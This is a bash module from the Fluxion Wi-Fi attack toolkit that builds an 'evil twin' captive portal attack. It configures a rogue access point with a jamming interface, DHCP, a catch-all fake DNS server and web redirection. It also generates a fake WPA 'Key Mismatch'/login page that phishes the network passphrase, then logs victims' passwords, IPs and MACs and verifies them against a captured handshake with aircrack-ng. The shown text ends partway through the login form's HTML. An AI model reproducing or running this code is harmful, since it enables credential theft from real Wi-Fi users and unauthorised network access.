#!/bin/bash

# ============================================================ #
# =============== < Captive Portal Parameters > ============== #
# ============================================================ #
CaptivePortalState="Not Ready"

CaptivePortalPassLog="$FLUXIONPath/attacks/Captive Portal/pwdlog"
CaptivePortalNetLog="$FLUXIONPath/attacks/Captive Portal/netlog"

CaptivePortalAuthenticationMethods=("hash") # "wpa_supplicant")
CaptivePortalAuthenticationMethodsInfo=(
  "(handshake file, ${CGrn}recommended$CClr)"
) # "(Target AP authentication, slow)")

# ============= < Virtual Network Configuration > ============ #
# To avoid collapsing with an already existing network,
# we'll use a somewhat uncommon network and server IP.
CaptivePortalVIGWAddress="192.168.254.1"
CaptivePortalVIGWNetwork=${CaptivePortalVIGWAddress%.*}


# ============================================================ #
# ============== < Captive Portal Subroutines > ============== #
# ============================================================ #
captive_portal_unset_jammer_interface() {
  if [ ! "$CaptivePortalJammerInterface" ]; then return 1; fi
  CaptivePortalJammerInterface=""

  # Check if we're automatically selecting the interface & skip
  # this one if so to take the user back properly.
  local interfacesAvailable
  readarray -t interfacesAvailable < <(attack_targetting_interfaces)

  if [ ${#interfacesAvailable[@]} -le 1 ]; then return 2; fi
}

captive_portal_set_jammer_interface() {
  if [ "$CaptivePortalJammerInterface" ]; then return 0; fi

  echo "Running get jammer interface." > $FLUXIONOutputDevice
  if ! fluxion_get_interface attack_targetting_interfaces \
    "$CaptivePortalJammerInterfaceQuery"; then
    echo "Failed to get jammer interface" > $FLUXIONOutputDevice
    return 1
  fi

  echo "Succeeded get jammer interface." > $FLUXIONOutputDevice
  CaptivePortalJammerInterface=${FluxionInterfaces[$FluxionInterfaceSelected]}
}

captive_portal_ap_interfaces() {
  interface_list_all
  local interface
  for interface in "${InterfaceListAll[@]}"; do
    if [ "$interface" = "lo" ]; then continue; fi
    echo "$interface"
  done
}

captive_portal_unset_ap_interface() {
  if [ ! "$CaptivePortalAPInterface" ]; then return 1; fi
  CaptivePortalAPInterface=""
}

captive_portal_set_ap_interface() {
  if [ "$CaptivePortalAPInterface" ]; then return 0; fi

  echo "Running get ap interface." > $FLUXIONOutputDevice
  if ! fluxion_get_interface captive_portal_ap_interfaces \
    "$CaptivePortalAPInterfaceQuery"; then
    echo "Failed to get ap interface" > $FLUXIONOutputDevice
    return 1
  fi

  echo "Succeeded get ap interface." > $FLUXIONOutputDevice
  CaptivePortalAPInterface=${FluxionInterfaces[$FluxionInterfaceSelected]}
}

captive_portal_unset_authenticator() {
  if [ ! "$CaptivePortalAuthenticatorMode" ]; then return 0; fi

  case "$CaptivePortalAuthenticatorMode" in
    "hash") fluxion_unset_hash ;;
  esac

  CaptivePortalAuthenticatorMode=""

  # If we've only got one option, then the user skipped this section
  # by auto-selecting that single option, so we unset the previous
  # phase along with this one to properly take the user back.
  if [ ${#CaptivePortalAuthenticationMethods[@]} -le 1 ]; then
    return 1 # Trigger undo chain because it was auto-selected.
  fi
}

captive_portal_set_authenticator() {
  if [ "$CaptivePortalAuthenticatorMode" ]; then
    echo "Captive Portal authentication mode is already set, skipping!" \
      > $FLUXIONOutputDevice
    return 0
  fi

  captive_portal_unset_authenticator

  # If we've got only one choice, auto-select it for the user.
  if [ \
    ${#CaptivePortalAuthenticationMethods[@]} -eq 1 -o \
    ${#CaptivePortalAuthenticationMethods[@]} -ge 1 -a \
    "$FLUXIONAuto" ]; then
    CaptivePortalAuthenticatorMode="${CaptivePortalAuthenticationMethods[0]}"
    echo "Auto-selected auth-method: $CaptivePortalAuthenticatorMode" \
      > $FLUXIONOutputDevice
  else
    fluxion_header

    echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
    echo

    fluxion_target_show "$FluxionTargetSSID" "$FluxionTargetEncryption" \
      "$FluxionTargetChannel" "$FluxionTargetMAC" "$FluxionTargetMaker"

    local choices=(
      "${CaptivePortalAuthenticationMethods[@]}"
      "$FLUXIONGeneralBackOption"
    )
    io_query_format_fields "" "\t$CRed[$CYel%d$CRed]$CClr %b %b\n" \
      choices[@] CaptivePortalAuthenticationMethodsInfo[@]

    echo

    CaptivePortalAuthenticatorMode="${IOQueryFormatFields[0]}"

    # If we're going back, reset everything and abort.
    if [[ \
      "$CaptivePortalAuthenticatorMode" == \
      "$FLUXIONGeneralBackOption" ]]; then
      captive_portal_unset_authenticator
      return -1
    fi
  fi

  # Process the authentication method selected.
  local result=1 # Assume failure at first.
  case "$CaptivePortalAuthenticatorMode" in
    "hash")
      # Pass default path if no path is set yet.
      if [ ! "$CaptivePortalHashPath" ]; then
        CaptivePortalHashPath="$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC.cap"
      fi

      fluxion_hash_get_path \
        "$CaptivePortalHashPath" "$FluxionTargetMAC" "$FluxionTargetSSID"
      result=$?

      if [ $result -eq 0 ]; then
        CaptivePortalHashPath="$FluxionHashPath"
      fi
      ;;
  esac

  # Assure authentication method processing succeeded, abort otherwise.
  if [[ $result -ne 0 ]]; then
    echo "Auth-mode error code $result!" > $FLUXIONOutputPath
    return 1
  fi
}

captive_portal_run_certificate_generator() {
  xterm -bg "#000000" -fg "#CCCCCC" \
    -title "Generating Self-Signed SSL Certificate" -e openssl req \
    -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' \
    -new -newkey rsa:2048 -days 365 -nodes -x509 \
    -keyout "$FLUXIONWorkspacePath/server.pem" \
    -out "$FLUXIONWorkspacePath/server.pem"
    # Details -> https://www.openssl.org/docs/manmaster/apps/openssl.html
  chmod 400 "$FLUXIONWorkspacePath/server.pem"
}

captive_portal_unset_certificate() {
  if [ ! "$CaptivePortalSSL" ]; then return 1; fi
  sandbox_remove_workfile "$FLUXIONWorkspacePath/server.pem"
  CaptivePortalSSL=""
}

# Create Self-Signed SSL Certificate
captive_portal_set_certificate() {
  if [ "$CaptivePortalSSL" ]; then
    echo "Captive Portal SSL mode already set to $CaptivePortalSSL!" \
      > $FLUXIONOutputDevice
    return 0
  fi

  captive_portal_unset_certificate

  # Check existance of ssl certificate within fluxion with file size > 0
  # If user-supplied (fancy) certificate exists, copy it to fluxspace.
  if [ \
    -f "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" -a \
    -s "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" \
    ]; then
    cp "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" \
      "$FLUXIONWorkspacePath/server.pem"

    CaptivePortalSSL="enabled" # Must be enabled if sourcing own certificate

    echo "Captive Portal certificate was user supplied, skipping query!" \
      > $FLUXIONOutputDevice
    return 0
  fi

  if [ "$FLUXIONAuto" ]; then
    # If cert generator fails, gtfo, something broke!
    if ! captive_portal_run_certificate_generator; then
      fluxion_conditional_bail "cert-gen failed!"
      return 2
    fi
    CaptivePortalSSL="enabled"
  else
    local choices=(
      "$CaptivePortalCertificateSourceGenerateOption"
      "$CaptivePortalCertificateSourceRescanOption"
      "$CaptivePortalCertificateSourceDisabledOption"
      "$FLUXIONGeneralBackOption"
    )

    io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]

    echo

    case "$IOQueryChoice" in
      "$CaptivePortalCertificateSourceGenerateOption")
        # If cert generator fails, gtfo, something broke!
        if ! captive_portal_run_certificate_generator; then
          fluxion_conditional_bail "cert-gen failed!"
          return 2
        fi
        CaptivePortalSSL="enabled"
        ;;

      "$CaptivePortalCertificateSourceRescanOption")
        captive_portal_set_certificate
        return $?
        ;;

      "$CaptivePortalCertificateSourceDisabledOption")
        CaptivePortalSSL="disabled"
        ;;

      "$FLUXIONGeneralBackOption")
        return 1
        ;;
      *)
        fluxion_conditional_bail "Unknown cert-gen option!"
        return 2
        ;;
    esac
  fi
}

captive_portal_unset_connectivity() {
  if [ ! "$CaptivePortalConnectivity" ]; then return 1; fi
  CaptivePortalConnectivity=""
}

captive_portal_set_connectivity() {
  if [ "$CaptivePortalConnectivity" ]; then return 0; fi

  captive_portal_unset_connectivity

  local choices=(
    "$CaptivePortalConnectivityDisconnectedOption"
    "$CaptivePortalConnectivityEmulatedOption"
    "$FLUXIONGeneralBackOption"
  )
  io_query_choice "$CaptivePortalConnectivityQuery" choices[@]

  case "$IOQueryChoice" in
    "$CaptivePortalConnectivityDisconnectedOption")
      CaptivePortalConnectivity="disconnected" ;;
    "$CaptivePortalConnectivityEmulatedOption")
      CaptivePortalConnectivity="emulated" ;;
    "$FLUXIONGeneralBackOption")
      return 1
      ;;
    *)
      fluxion_conditional_bail "Unknown connectivity option!"
      return 2
      ;;
  esac
}

captive_portal_unset_user_interface() {
  if [ -z "$CaptivePortalUserInterface" -o \
    ! -d "$FLUXIONPath/attacks/Captive Portal/sites/$CaptivePortalUserInterface.portal" ]; then return 1; fi
  CaptivePortalUserInterface=""
}

captive_portal_set_user_interface() {
  if [ "$CaptivePortalUserInterface" != "" -a \
    -d "$FLUXIONPath/attacks/Captive Portal/sites/$CaptivePortalUserInterface.portal" ]; then return 0; fi

  captive_portal_unset_portal

  local sites=()

  # Attempt adding only if the directory exists.
  if [ -d attacks/Captive\ Portal/generic/languages ]; then
    # Retrieve all generic sites available.
    for site in attacks/Captive\ Portal/generic/languages/*.lang; do
      sites+=("${CaptivePortalGenericInterfaceOption}_$(basename "${site%.lang}")")
    done
  fi

  # Attempt adding only if the directory exists.
  if [ -d attacks/Captive\ Portal/sites ]; then
    # Retrieve all available portal sites and
    # store them without the .portal extension.
    for site in attacks/Captive\ Portal/sites/*.portal; do
      sites+=("$(basename "${site%.portal}")")
    done
  fi

  local sitesIdentifier=("${sites[@]/_*/}" "$FLUXIONGeneralBackOption")
  local sitesLanguage=("${sites[@]/*_/}")

  format_center_dynamic "$CRed[$CYel%02d$CRed]$CClr %-44b $CBlu%10s$CClr"
  local queryFieldOptionsFormat=$FormatCenterDynamic

  fluxion_header

  echo -e "$FLUXIONVLine $CaptivePortalUIQuery"

  echo

  fluxion_target_show "$FluxionTargetSSID" "$FluxionTargetEncryption" \
    "$FluxionTargetChannel" "$FluxionTargetMAC" "$FluxionTargetMaker"

  io_query_format_fields "" "$queryFieldOptionsFormat\n" \
    sitesIdentifier[@] sitesLanguage[@]

  echo

  local site="${IOQueryFormatFields[0]}"
  local siteLanguage="${IOQueryFormatFields[1]}"
  local sitePath="${site}_${siteLanguage}"

  case "$site" in
    "$CaptivePortalGenericInterfaceOption")
      source "$FLUXIONPath/attacks/Captive Portal/generic/languages/$siteLanguage.lang"
      captive_portal_generic
      ;;
    "$FLUXIONGeneralBackOption")
      captive_portal_unset_portal
      return 1
      ;;
    *)
      CaptivePortalUserInterface=$sitePath
      ;;
  esac
}


captive_portal_get_client_IP() {
  if [ -f "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" ]; then
    MatchedClientIP=$(
      cat "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" | \
        sed '/^\s*$/d' | tail -n 1 | head -n 1
    )
  else
    MatchedClientIP="unknown"
  fi

  echo $MatchedClientIP
}

captive_portal_get_IP_MAC() {
  if [ -f "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" ] && \
    [ "$(captive_portal_get_client_IP)" != "" ] && \
    [ -f "$FLUXIONWorkspacePath/clients.txt" ]; then
    local IP=$(captive_portal_get_client_IP)
    local MatchedClientMAC=$(
      cat $FLUXIONWorkspacePath/clients.txt | \
        grep $IP | awk '{print $5}' | grep : | head -n 1 | \
        tr [:upper:] [:lower:]
    )
    if [ "$(echo $MatchedClientMAC | wc -m)" != "18" ]; then
      local MatchedClientMAC="xx:xx:xx:xx:xx:xx"
    fi
  else
    local MatchedClientMAC="unknown"
  fi
  echo $MatchedClientMAC
}

captive_portal_get_MAC_brand() {
  if [ $(captive_portal_get_IP_MAC) != "" ]; then
    local MACManufacturer=$( macchanger -l | \
      grep "$(echo "$(captive_portal_get_IP_MAC)" | cut -d ":" -f -3)" | \
      cut -d " " -f 5-)
    if echo "$MACManufacturer" | grep -q x; then
      local MACManufacturer="unknown"
    fi
  else
    local MACManufacturer="unknown"
  fi

  echo $MACManufacturer
}


captive_portal_unset_attack() {
  sandbox_remove_workfile \
    "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
  sandbox_remove_workfile \
    "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
  sandbox_remove_workfile "$FLUXIONWorkspacePath/lighttpd.conf"
  sandbox_remove_workfile "$FLUXIONWorkspacePath/dhcpd.leases"
  sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal/check.php"
  sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"

  # Only reset the AP if one has been defined.
  if [ "$APRogueService" -a "$(type -t ap_reset)" ]; then
    ap_reset
  fi
}

# Create different settings required for the script
captive_portal_set_attack() {
  # Load and set the captive portal user interface.
  cp -r "$FLUXIONPath/attacks/Captive Portal/sites/$CaptivePortalUserInterface.portal" \
        "$FLUXIONWorkspacePath/captive_portal"

  find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec \
    sed -i -e 's/$APTargetSSID/'"${FluxionTargetSSID//\//\\\/}"'/g; s/$APTargetMAC/'"${FluxionTargetMAC//\//\\\/}"'/g; s/$APTargetChannel/'"${FluxionTargetChannel//\//\\\/}"'/g' {} \;


  # Add the PHP authenticator scripts, used to verify
  # password attempts from users using the web interface.
  local authenticatorFiles=("authenticator.php" "check.php" "update.php")

  for authenticatorFile in "${authenticatorFiles[@]}"; do
    cp "$FLUXIONPath/attacks/Captive Portal/lib/$authenticatorFile" \
      "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
    sed -i -e 's/\$FLUXIONWorkspacePath/'"${FLUXIONWorkspacePath//\//\\\/}"'/g' \
      "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
    chmod u+x "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
  done

  # Add the files for captive portal internet connectivity checks.
  cp -r "$FLUXIONPath/attacks/Captive Portal/lib/connectivity responses/" \
    "$FLUXIONWorkspacePath/captive_portal/connectivity_responses"


  # AP Service: Prepare service for an attack.
  if [ "$APRogueService" ]; then
    ap_prep
  fi


  # Generate the dhcpd configuration file, which is
  # used to provide DHCP service to APRogue clients.
  echo "\
authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $CaptivePortalVIGWNetwork.0 netmask 255.255.255.0 {
	option broadcast-address $CaptivePortalVIGWNetwork.255;
	option routers $CaptivePortalVIGWAddress;
	option subnet-mask 255.255.255.0;
	option domain-name-servers $CaptivePortalVIGWAddress;

	range $CaptivePortalVIGWNetwork.100 $CaptivePortalVIGWNetwork.254;
}\
" >"$FLUXIONWorkspacePath/dhcpd.conf"

  #create an empty leases file
  touch "$FLUXIONWorkspacePath/dhcpd.leases"

  # Generate configuration for a lighttpd web-server.
  echo "\
server.document-root = \"$FLUXIONWorkspacePath/captive_portal/\"

server.modules = (
	\"mod_access\",
	\"mod_alias\",
	\"mod_accesslog\",
	\"mod_fastcgi\",
	\"mod_redirect\",
	\"mod_rewrite\"
)

accesslog.filename = \"$FLUXIONWorkspacePath/lighttpd.log\"

fastcgi.server = (
	\".php\" => (
		(
			\"bin-path\" => \"/usr/bin/php-cgi\",
			\"socket\" => \"/php.socket\"
		)
	)
)

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
	\".html\" => \"text/html\",
	\".htm\" => \"text/html\",
	\".txt\" => \"text/plain\",
	\".jpg\" => \"image/jpeg\",
	\".png\" => \"image/png\",
	\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extensions = (
	\".fcgi\",
	\".php\",
	\".rb\",
	\"~\",
	\".inc\"
)

index-file.names = (
	\"index.htm\",
	\"index.html\",
    \"index.php\"
)
" >"$FLUXIONWorkspacePath/lighttpd.conf"

  # Configure lighttpd's SSL only if we've got a certificate and its key.
  if [ -f "$FLUXIONWorkspacePath/server.pem" -a -s "$FLUXIONWorkspacePath/server.pem" ]; then
    echo "\
\$SERVER[\"socket\"] == \":443\" {
	ssl.engine = \"enable\"
	ssl.pemfile = \"$FLUXIONWorkspacePath/server.pem\"
}
" >>"$FLUXIONWorkspacePath/lighttpd.conf"
  fi

  if [ "$CaptivePortalConnectivity" = "emulated" ]; then
    echo "\
# The following will emulate Apple's and Google's internet connectivity checks.
# This should help with no-internet-connection warnings in some devices.
\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Apple/\"
}

# Respond with Google's captive response on certain domains.
# Domains: www.google.com, clients[0-9].google.com, connectivitycheck.gstatic.com, connectivitycheck.android.com, android.clients.google.com, alt[0-9]-mtalk.google.com, mtalk.google.com
\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
}
" >>"$FLUXIONWorkspacePath/lighttpd.conf"
  else
    echo "\
# Redirect all traffic to the captive portal when not emulating a connection.
\$HTTP[\"host\"] != \"captive.gateway.lan\" {
	url.redirect-code = 302
	url.redirect  = (
		\"^/(.*)\" => \"http://captive.gateway.lan/\",
	)
}
" >>"$FLUXIONWorkspacePath/lighttpd.conf"
  fi

  # Create a DNS service with python, forwarding all traffic to gateway.
  echo "\
import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.dominio+=data[ini+1:ini+lon+1]+'.'
        ini+=lon+1
        lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$CaptivePortalVIGWAddress'
  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()\
" >"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"

  chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"

  local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//"/\\"}
  # Attack arbiter script
  echo "\
#!/bin/bash

signal_stop_attack() {
	kill -s SIGABRT $$ # Signal STOP ATTACK
	handle_abort_authenticator
}

handle_abort_authenticator() {
	AuthenticatorState=\"aborted\"
}

trap signal_stop_attack SIGINT SIGHUP
trap handle_abort_authenticator SIGABRT

echo > \"$FLUXIONWorkspacePath/candidate.txt\"
echo -n \"0\"> \"$FLUXIONWorkspacePath/hit.txt\"

# Assure we've got a directory to store net logs into.
if [ ! -d \"$CaptivePortalNetLog\" ]; then
	mkdir -p \"$CaptivePortalNetLog\"
fi

# Assure we've got a directory to store pwd logs into.
if [ ! -d \"$CaptivePortalPassLog\" ]; then
	mkdir -p \"$CaptivePortalPassLog\"
fi

# Make console cursor invisible, cnorm to revert.
tput civis
clear

m=0
h=0
s=0
i=0

AuthenticatorState=\"running\"

startTime=\$(date +%s)

while [ \$AuthenticatorState = \"running\" ]; do
	let s=\$(date +%s)-\$startTime

	d=\`expr \$s / 86400\`
	s=\`expr \$s % 86400\`
	h=\`expr \$s / 3600\`
	s=\`expr \$s % 3600\`
	m=\`expr \$s / 60\`
	s=\`expr \$s % 60\`

	if [ \"\$s\" -le 9 ]; then
		is=\"0\"
	else
		is=
	fi

	if [ \"\$m\" -le 9 ]; then
		im=\"0\"
	else
		im=
	fi

	if [ \"\$h\" -le 9 ]; then
		ih=\"0\"
	else
		ih=
	fi

	if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]; then
		# Save any new password attempt.
		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"

		# Clear logged password attempt.
		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
	fi

	if [ -f \"$FLUXIONWorkspacePath/ip_hits\" -a -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]; then
		cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
		echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
		echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
	fi

" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

  if [ $CaptivePortalAuthenticatorMode = "hash" ]; then
    echo "
	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
		# Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
		if ! aircrack-ng -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$CaptivePortalHashPath\" | grep -qi \"Passphrase not in\"; then
            echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"

			sleep 1
			break

		else
			echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"

		fi
	fi" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
  fi

  local -r staticSSID=$(printf "%q" "$FluxionTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
  echo "
	DHCPClients=($(nmap -PR -sn -n -oG - $CaptivePortalVIGWNetwork.100-110 2>&1 | grep Host))

	echo
	echo -e \"  ACCESS POINT:\"
	printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
	echo -e \"    MAC ............: $CYel$FluxionTargetMAC$CClr\"
	echo -e \"    Channel ........: $CWht$FluxionTargetChannel$CClr\"
	echo -e \"    Vendor .........: $CGrn${FluxionTargetMaker:-UNKNOWN}$CClr\"
	echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
	echo -e \"    Attempts .......: $CRed\$(cat $FLUXIONWorkspacePath/hit.txt)$CClr\"
	echo -e \"    Clients ........: $CBlu\$(cat $FLUXIONWorkspacePath/clients.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)$CClr\"
	echo
	echo -e \"  CLIENTS ONLINE:\"

	x=0
	for client in \"\${DHCPClients[@]}\"; do
		x=\$((\$x+1))

		ClientIP=\$(echo \$client| cut -d \" \" -f2)
		ClientMAC=\$(nmap -PR -sn -n \$ClientIP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])

		if [ \"\$(echo \$ClientMAC| wc -m)\" != \"18\" ]; then
			ClientMAC=\"xx:xx:xx:xx:xx:xx\"
		fi

		ClientMID=\$(macchanger -l | grep \"\$(echo \"\$ClientMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)

		if echo \$ClientMAC| grep -q x; then
			ClientMID=\"unknown\"
		fi

		ClientHostname=\$(grep \$ClientIP \"$FLUXIONWorkspacePath/clients.txt\" | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')

		echo -e \"    $CGrn \$x) $CRed\$ClientIP $CYel\$ClientMAC $CClr($CBlu\$ClientMID$CClr) $CGrn \$ClientHostname$CClr\"
	done

	echo -ne \"\033[K\033[u\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

  if [ $CaptivePortalAuthenticatorMode = "hash" ]; then
    echo "
	sleep 1" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
  fi

  echo "
done

if [ \$AuthenticatorState = \"aborted\" ]; then exit 1; fi

clear
echo \"1\" > \"$FLUXIONWorkspacePath/status.txt\"

# sleep 7
sleep 3

signal_stop_attack

echo \"
FLUXION $FLUXIONVersion.$FLUXIONRevision

SSID: \\\"$staticSSID\\\"
BSSID: $FluxionTargetMAC ($FluxionTargetMaker)
Channel: $FluxionTargetChannel
Security: $FluxionTargetEncryption
Time: \$ih\$h:\$im\$m:\$is\$s
Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
Mac: $(captive_portal_get_IP_MAC) ($(captive_portal_get_MAC_brand))
IP: $(captive_portal_get_client_IP)
\" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

  if [ $CaptivePortalAuthenticatorMode = "hash" ]; then
    echo "
aircrack-ng -a 2 -b $FluxionTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
  fi

  chmod +x "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
}

# Generate the contents for a generic web interface
captive_portal_generic() {
  if [ ! -d "$FLUXIONWorkspacePath/captive_portal" ]; then
    mkdir "$FLUXIONWorkspacePath/captive_portal"
  fi

  base64 -d "$FLUXIONPath/attacks/Captive Portal/generic/assets" >"$FLUXIONWorkspacePath/file.zip"

  unzip "$FLUXIONWorkspacePath/file.zip" -d "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
  sandbox_remove_workfile "$FLUXIONWorkspacePath/file.zip"

  echo "\
<!DOCTYPE html>
<html>
	<head>
		<meta charset=\"UTF-8\">
		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

		<title>Wireless Protected Access: Verifying</title>

		<!-- Styles -->
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
	</head>
	<body>
		<!-- final page -->
		<div id=\"done\" data-role=\"page\" data-theme=\"a\">
			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
				<h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
			</div>
		</div>
	</body>
</html>" >"$FLUXIONWorkspacePath/captive_portal/final.html"

  echo "\
<!DOCTYPE html>
<html>
	<head>
		<meta charset=\"UTF-8\">
		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

		<title>Wireless Protected Access: Key Mismatch</title>

		<!-- Styles -->
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
		<script src=\"js/jquery.validate.min.js\"></script>
		<script src=\"js/additional-methods.min.js\"></script>
	</head>
	<body>
		<!-- Error page -->
		<div data-role=\"page\" data-theme=\"a\">
			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
				<h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
				<a href=\"index.html\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.html'\">$DIALOG_WEB_BACK</a>
			</div>
		</div>
	</body>
</html>" >"$FLUXIONWorkspacePath/captive_portal/error.html"

  echo "\
<!DOCTYPE html>
<html>
	<head>
		<meta charset=\"UTF-8\">
		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

		<title>Wireless Protected Access: Login</title>

		<!-- Styles -->
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
		<script src=\"js/jquery.validate.min.js\"></script>
		<script src=\"js/additional-methods.min.js\"></script>
	</head>
	<body>
		<!-- Main page -->
		<div data-role=\"page\" data-theme=\"a\">
			<div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
				<fieldset>
					<form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
						</br>
						<div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
							<div><u>$FluxionTargetSSID</u> ($FluxionTargetMAC)</div>
							<!--<div>Channel: $FluxionTargetChannel</div>-->
						</div>
						<div style=\"text-align:center;\">
							<br>
							<label>$DIALOG_WEB_INFO</label>
							<br>
						</div>
						<div class=\"ui-field-contain\">
							<label for=\"key1\">$DIALOG_WEB_INPUT</label>
							<input id=\"key1\" style=\"color:#333; background-color:#CCC\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
						</div>
						<input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
					</form>
